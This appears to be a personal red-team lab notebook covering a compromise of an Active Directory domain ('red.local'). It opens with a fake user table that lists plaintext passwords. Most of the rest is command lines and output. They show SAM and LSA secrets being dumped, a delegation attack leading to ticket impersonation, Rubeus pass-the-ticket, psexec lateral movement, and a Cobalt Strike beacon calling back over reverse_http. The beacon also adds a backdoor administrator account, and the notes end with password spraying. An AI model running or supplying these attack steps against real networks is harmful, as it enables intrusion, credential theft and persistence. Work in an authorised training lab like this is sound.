67   tony_s            BadaBing#47        Tony Soprano               tony.soprano@email.us              1959-08-24   North Caldwell, NJ                   +1-973-555-2222    USA              2025-03-07 22:40:09   

68   john_wick         Parabellum99       John Wick                  john.wick@email.us                 1964-09-02   The Continental, New York            +1-212-555-0199    USA              2025-03-07 22:40:09   

69   vader_d           SithLord#77        Darth Vader                darth.vader@email.deathstar        1977-05-25   Death Star                           +99-9999-9999      Galaxy Empire    2025-03-07 22:40:09   

70   rocky_b           ItalianStallion!   Rocky Balboa               rocky.balboa@email.us              1945-07-06   Philadelphia, PA                     +1-215-555-0606    USA              2025-03-07 22:40:09   

71   jack_sparrow      WhyIsTheRumGone    Jack Sparrow               jack.sparrow@email.caribbean       1700-05-16   Black Pearl                          +99-9999-0000      High Seas        2025-03-07 22:40:09   

72   peter_p           WithGreatPower     Peter Parker               peter.parker@email.us              1990-08-10   20 Ingram Street, Queens, NY         +1-718-555-2000    USA              2025-03-07 22:40:09   

73   bruce_w           IamBatman          Bruce Wayne                bruce.wayne@email.us               1972-02-19   Wayne Manor, Gotham City             +1-212-555-0110    USA              2025-03-07 22:40:09   

74   clark_k           Kryptonian007      Clark Kent                 clark.kent@email.us                1938-06-18   Metropolis                           +1-555-999-8888    USA              2025-03-07 22:40:09   

75   kratos_g          Boy#Ragnarok       Kratos                     kratos@email.godwar                1000-01-01   Midgard                              +99-9999-9998      Unknown          2025-03-07 22:40:09   

76   lara_c            TombRaider99       Lara Croft                 lara.croft@email.uk                1992-02-14   London, England                      +44-20-7946-0707   UK               2025-03-07 22:40:09   

77   masterchief       117Cortana!        John-117                   masterchief@email.unsc             2511-03-07   UNSC Infinity                        +99-9999-9997      Earth            2025-03-07 22:40:09   

78   geralt_r          WhiteWolf99        Geralt of Rivia            geralt.rivia@email.witcher         1200-04-01   Kaer Morhen                          +99-9999-3333      The Continent    2025-03-07 22:40:09   

79   rick_s            GetSchwifty!       Rick Sanchez               rick.sanchez@email.dimensions      1960-01-26   Earth C-137                          +99-9999-1001      Unknown          2025-03-07 22:40:09   

80   mario_b           ItsAMe!            Mario                      mario.bros@email.mushroom          1981-07-09   Mushroom Kingdom                     +99-9999-2000      Nintendo World   2025-03-07 22:40:09   

81   sonic_h           GottaGoFast!       Sonic the Hedgehog         sonic.hedgehog@email.sega          1991-06-23   Green Hill Zone                      +99-9999-3000      Mobius           2025-03-07 22:40:09   

82   randal_hughkawk   GetJessed69!       Randal HughPhatkawk        Randal.HughPhatkawk@email.jordan   2000-12-01   GID HeadQuarters                     +99-9999-1000      Unknown          2025-03-07 22:40:09   


```


```python
kali@kali ~> proxychains -q nxc smb 10.2.20.21 -u 'mgmtadmin' -p 'OIJFGr4jlkgr' --sam
SMB         10.2.20.21      445    MGMT-PC-2        [*] Windows 11 Build 22621 x64 (name:MGMT-PC-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.20.21      445    MGMT-PC-2        [+] red.local\mgmtadmin:OIJFGr4jlkgr (Pwn3d!)
SMB         10.2.20.21      445    MGMT-PC-2        [*] Dumping SAM hashes
SMB         10.2.20.21      445    MGMT-PC-2        Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.2.20.21      445    MGMT-PC-2        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.2.20.21      445    MGMT-PC-2        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.2.20.21      445    MGMT-PC-2        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8d2f348f2b4b2b5d4a52dc665f995698:::
SMB         10.2.20.21      445    MGMT-PC-2        [+] Added 4 SAM hashes to the database
kali@kali ~> proxychains -q nxc smb 10.2.20.21 -u 'mgmtadmin' -p 'OIJFGr4jlkgr' --lsa
SMB         10.2.20.21      445    MGMT-PC-2        [*] Windows 11 Build 22621 x64 (name:MGMT-PC-2) (domain:red.local) (signing:False) (SMBv1:False)
SMB         10.2.20.21      445    MGMT-PC-2        [+] red.local\mgmtadmin:OIJFGr4jlkgr (Pwn3d!)
SMB         10.2.20.21      445    MGMT-PC-2        [+] Dumping LSA secrets
SMB         10.2.20.21      445    MGMT-PC-2        red\MGMT-PC-2$:aes256-cts-hmac-sha1-96:dac8a967418280149465786a4520cfa4e8958ccbfc82e3eb7e3650d203f648eb
SMB         10.2.20.21      445    MGMT-PC-2        red\MGMT-PC-2$:aes128-cts-hmac-sha1-96:538351242de65ff5cf5864ae85b0fc55
SMB         10.2.20.21      445    MGMT-PC-2        red\MGMT-PC-2$:des-cbc-md5:98759b2562cba2fb
SMB         10.2.20.21      445    MGMT-PC-2        red\MGMT-PC-2$:plain_password_hex:740051007900610048003f002500690047003e0029004b0041004d005700510052002f0071002e0075002700530056006900310041002a0049003900790054007200260042002b00590068005c0054003d004d006f00710060005a00720046004d00250031004200250072007a002a00200027003d0023005f00770067005300590064004b004e00350055005f005a00530070005f004b0033002a00450064007300360026003b006f0061006c006b00700055004e006600390046002e00320021003e004a005c0061005e002c004500460069005c00380052006c003c0061007700780038002e003700420078006100
SMB         10.2.20.21      445    MGMT-PC-2        red\MGMT-PC-2$:aad3b435b51404eeaad3b435b51404ee:6fc1fcaf7fc58e2c8cf0ee5c144ab92b:::
SMB         10.2.20.21      445    MGMT-PC-2        red.local\rangeadm:password
SMB         10.2.20.21      445    MGMT-PC-2        dpapi_machinekey:0x7f3d280d003c20b80d108342c8c3c599f17cda76
dpapi_userkey:0x1f00a97539d2d1753ebf32fda2b001a0740713a8
```



```python
kali@kali ~> rbcd.py -delegate-from 'MGMT-PC-2$' -delegate-to 'CEO-PC-2$' -dc-ip '10.2.10.11' -action 'write' 'red.local'/'MGMT-PC-2$' -hashes ':6fc1fcaf7fc58e2c8cf0ee5c144ab92b'
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] MGMT-PC-2$ can now impersonate users on CEO-PC-2$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     MGMT-PC-2$   (S-1-5-21-54816899-3316220569-2952399223-1110)
```



```python
kali@kali ~> getST.py -spn cifs/CEO-PC-2.red.local -impersonate Administrator -dc-ip 10.2.10.11 red.local/MGMT-PC-2\$ -hashes ':6fc1fcaf7fc58e2c8cf0ee5c144ab92b'
Impacket v0.13.0.dev0+20250307.160229.6e0a969 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_CEO-PC-2.red.local@RED.LOCAL.ccache
```


first get a beacon then use make token

```python
[03/13 14:22:43] beacon> make_token red.local\mgmtadmin OIJFGr4jlkgr
[03/13 14:22:43] [*] Tasked beacon to create a token for red.local\mgmtadmin
[03/13 14:23:10] [+] host called home, sent: 66 bytes
[03/13 14:23:11] [+] Impersonated red.local\mgmtadmin (netonly)
```

then i spawn a child just for stabilities sake and do everythong on the child

```python
[03/13 14:24:01] beacon> spawn x64 initial
[03/13 14:24:01] [*] Tasked beacon to spawn (x64) windows/beacon_http/reverse_http (10.2.30.1:6969)
[03/13 14:24:02] [+] host called home, sent: 307208 bytes
```


```python
[03/13 14:29:18] beacon> rportfwd 7000 10.2.30.1 7000
[03/13 14:29:18] [+] started reverse port forward on 7000 to 10.2.30.1:7000
[03/13 14:29:18] [*] Tasked beacon to forward port 7000 to 10.2.30.1:7000
[03/13 14:29:18] [+] host called home, sent: 10 bytes
```


then to get a shell on mgmt-pc-2 i upload my smb beacon on mgmt-pc-2 using smbclient.py and then execute using link




```python
[03/13 14:24:22] beacon> link mgmt-pc-2 msagent_e2
[03/13 14:24:22] [*] Tasked to link to \\mgmt-pc-2\pipe\msagent_e2
[03/13 14:25:06] [+] host called home, sent: 102 bytes
[03/13 14:25:07] [+] Impersonated red.local\mgmtadmin (netonly)
[03/13 14:25:07] [+] established link to child beacon: 10.2.20.21
```


```python
[03/13 14:39:36] beacon> execute-assembly /home/kali/tools/Rubeus.exe ptt /ticket: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

[03/13 14:39:37] [*] Tasked beacon to run .NET program: Rubeus.exe ptt /ticket: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

[03/13 14:39:38] [+] host called home, sent: 616908 bytes
[03/13 14:39:42] [+] received output:


   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
  v2.3.2 

[*] Action: Import Ticket
[+] Ticket successfully imported!

```




```
[03/13 14:41:59] beacon> jump psexec64 ceo-pc-2 SMB
[03/13 14:42:00] [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_e2) on ceo-pc-2 via Service Control Manager (\\ceo-pc-2\ADMIN$\c982440.exe)
[03/13 14:42:01] [+] host called home, sent: 356149 bytes
[03/13 14:42:28] [+] received output:
Started service c982440 on ceo-pc-2
[03/13 14:42:28] [+] established link to child beacon: 10.2.20.22
```







remember that 



```python
[03/13 18:47:54] beacon> shell net users sawyer Password123! /add
[03/13 18:47:54] [*] Tasked beacon to run: net users sawyer Password123! /add
[03/13 18:47:56] [+] host called home, sent: 65 bytes
[03/13 18:47:56] [+] received output:
The command completed successfully.




[03/13 18:48:16] beacon> shell net localgroup Administrators sawyer /add
[03/13 18:48:16] [*] Tasked beacon to run: net localgroup Administrators sawyer /add
[03/13 18:48:17] [+] host called home, sent: 72 bytes
[03/13 18:48:18] [+] received output:
The command completed successfully.


```




```
[03/13 18:56:53] beacon> ps
[03/13 18:56:53] [*] Tasked beacon to list processes
[03/13 18:56:55] [+] host called home, sent: 12 bytes
[03/13 18:56:56] [*] Process List

[*] This Beacon PID:    YELLOW 6504  
 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 0     0     [System Process]                                         
 4     0         System                             x64   0           NT AUTHORITY\SYSTEM
 116   4             Registry                       x64   0           NT AUTHORITY\SYSTEM
 476   4             smss.exe                       x64   0           NT AUTHORITY\SYSTEM
 2684  4             Memory Compression             x64   0           NT AUTHORITY\SYSTEM
 616   604   csrss.exe                              x64   0           NT AUTHORITY\SYSTEM
 688   604   wininit.exe                            x64   0           NT AUTHORITY\SYSTEM
 388   688       fontdrvhost.exe                    x64   0           Font Driver Host\UMFD-0
 832   688       services.exe                       x64   0           NT AUTHORITY\SYSTEM
 516   832           VSSVC.exe                      x64   0           NT AUTHORITY\SYSTEM
 684   832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE
 764   832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 976   832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 1248  832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE
 1264  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1272  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1284  832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE
 1344  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1364  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1444  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1528  832           dllhost.exe                    x64   0           NT AUTHORITY\SYSTEM
 1532  832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE
 1552  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1600  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 1624  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1644  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 1724  832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE
 1732  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1824  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 1840  832           msdtc.exe                      x64   0           NT AUTHORITY\NETWORK SERVICE
 1844  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 1904  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2128  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2144  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2228  832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE
 2244  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2364  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2424  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 2472  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2480  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2500  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 2516  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2536  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2712  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2760  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2772  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 2808  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 2820  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 2880  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 2884  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 2952  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 2992  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 3008  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 4428  3008              ctfmon.exe                 x64   1           NT AUTHORITY\SYSTEM
 3088  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 3232  832           spoolsv.exe                    x64   0           NT AUTHORITY\SYSTEM
 3288  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 3992  3288              AggregatorHost.exe         x64   0           NT AUTHORITY\SYSTEM
 3296  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 3316  832           blnsvr.exe                     x64   0           NT AUTHORITY\SYSTEM
 3352  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 3420  832           qemu-ga.exe                    x64   0           NT AUTHORITY\SYSTEM
 3444  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 3476  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 3484  832           MsMpEng.exe                    x64   0           NT AUTHORITY\SYSTEM
 3508  832           wlms.exe                       x64   0           NT AUTHORITY\SYSTEM
 3532  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 4000  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 4180  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 4252  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 4272  832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE
 4304  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 4520  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 4572  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 4920  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 4936  832           MpDefenderCoreService.exe      x64   0           NT AUTHORITY\SYSTEM
 5020  832           SearchIndexer.exe              x64   0           NT AUTHORITY\SYSTEM
 5092  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 5472  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 5584  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 5620  832           svchost.exe                    x64   0           NT AUTHORITY\NETWORK SERVICE
 5828  832           svchost.exe                    x64   0           NT AUTHORITY\SYSTEM
 5968  832           elastic-agent.exe              x64   0           NT AUTHORITY\SYSTEM
 1376  5968              filebeat.exe               x64   0           NT AUTHORITY\SYSTEM
 3568  1376                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 2256  5968              metricbeat.exe             x64   0           NT AUTHORITY\SYSTEM
 5380  2256                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 2400  5968              metricbeat.exe             x64   0           NT AUTHORITY\SYSTEM
 5220  2400                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 2736  5968              filebeat.exe               x64   0           NT AUTHORITY\SYSTEM
 5084  2736                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 4576  5968              filebeat.exe               x64   0           NT AUTHORITY\SYSTEM
 564   4576                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 5408  5968              metricbeat.exe             x64   0           NT AUTHORITY\SYSTEM
 1328  5408                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 5672  5968              metricbeat.exe             x64   0           NT AUTHORITY\SYSTEM
 1884  5672                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 6040  832           elastic-endpoint.exe           x64   0           NT AUTHORITY\SYSTEM
 2600  6040              elastic-endpoint.exe       x64   0           NT AUTHORITY\SYSTEM
 4024  2600                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 4388  6040              elastic-endpoint.exe       x64   0           NT AUTHORITY\SYSTEM
 4228  4388                  conhost.exe            x64   0           NT AUTHORITY\SYSTEM
 6072  832           svchost.exe                    x64   0           NT AUTHORITY\LOCAL SERVICE
 6484  832           dllhost.exe                    x64   0           NT AUTHORITY\SYSTEM
 860   688       lsass.exe                          x64   0           NT AUTHORITY\SYSTEM
 696   680   csrss.exe                              x64   1           NT AUTHORITY\SYSTEM
 788   680   winlogon.exe                           x64   1           NT AUTHORITY\SYSTEM
 520   788       fontdrvhost.exe                    x64   1           Font Driver Host\UMFD-1
 1088  788       LogonUI.exe                        x64   1           NT AUTHORITY\SYSTEM
 1112  788       dwm.exe                            x64   1           Window Manager\DWM-1
 4848  5492  rundll32.exe                           x64   0           NT AUTHORITY\SYSTEM
 3948  4848      rundll32.exe                       x64   0           NT AUTHORITY\SYSTEM
 5676  4848      cmd.exe                            x64   0           NT AUTHORITY\SYSTEM
 876   5676          conhost.exe                    x64   0           NT AUTHORITY\SYSTEM
 6764  5676          net.exe                        x64   0           NT AUTHORITY\SYSTEM
 2180  6764              net1.exe                   x64   0           NT AUTHORITY\SYSTEM
 6268  4848      cmd.exe                            x64   0           NT AUTHORITY\SYSTEM
 5884  6268          conhost.exe                    x64   0           NT AUTHORITY\SYSTEM
 6328  6268          net.exe                        x64   0           NT AUTHORITY\SYSTEM
 6724  6328              net1.exe                   x64   0           NT AUTHORITY\SYSTEM
 6504  4848      rundll32.exe                       x64   0           NT AUTHORITY\SYSTEM
 6372  6504          rundll32.exe                   x64   0           NT AUTHORITY\SYSTEM
 6680  6504          rundll32.exe                   x64   0           NT AUTHORITY\SYSTEM
 7080  4848      cmd.exe                            x64   0           NT AUTHORITY\SYSTEM
 2984  7080          net.exe                        x64   0           NT AUTHORITY\SYSTEM
 6420  2984              net1.exe                   x64   0           NT AUTHORITY\SYSTEM
 3060  7080          conhost.exe                    x64   0           NT AUTHORITY\SYSTEM
 4924  5372  MicrosoftEdgeUpdate.exe                x86   0           NT AUTHORITY\SYSTEM
```



```python
kali@kali ~> cat notes.txt 
Note to CEO:

You left some sensitive files on your PC while you were out. We redacted the copy on your PC and moved the original to the vault.


Sincerely,
RED IT TEAM

P.S. in case you forgot your vault login again, here it is.

ceo
W3lc0m3t0tH3V4ult!

```



what have I tried so far

- keeppass vault, (tried to find using gci command that looks for the file extention
	- nothing there, cant find it
- an smbshare that the CEO has access too?
	- havent checked yet
- spray credentials maybe another user has the same password (tried)
    - sprayed local admin on the box
    - sprayed the computer account of said box
    - sprayed the users enumerated from the DC
    - sprayed CEO:W3lc0m3t0tH3V4ult!
	    - On domain 
	    - local auth 
		    - on the .10 subnet using the ceo name
			    - used local auth
			    - used domain auth
		    - on DOMAIN CONTROLLOR
- tried to dump the box creds & cant




```
[03/18 10:40:51] beacon> shell ping vault
[03/18 10:40:51] [*] Tasked beacon to run: ping vault
[03/18 10:40:52] [+] host called home, sent: 41 bytes
[03/18 10:40:56] [+] received output:


Pinging vault.home.arpa [10.2.40.4] with 32 bytes of data:

Reply from 10.2.40.4: bytes=32 time<1ms TTL=63

Reply from 10.2.40.4: bytes=32 time<1ms TTL=63

Reply from 10.2.40.4: bytes=32 time=1ms TTL=63

Reply from 10.2.40.4: bytes=32 time=1ms TTL=63



Ping statistics for 10.2.40.4:

    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

    Minimum = 0ms, Maximum = 1ms, Average = 0ms

```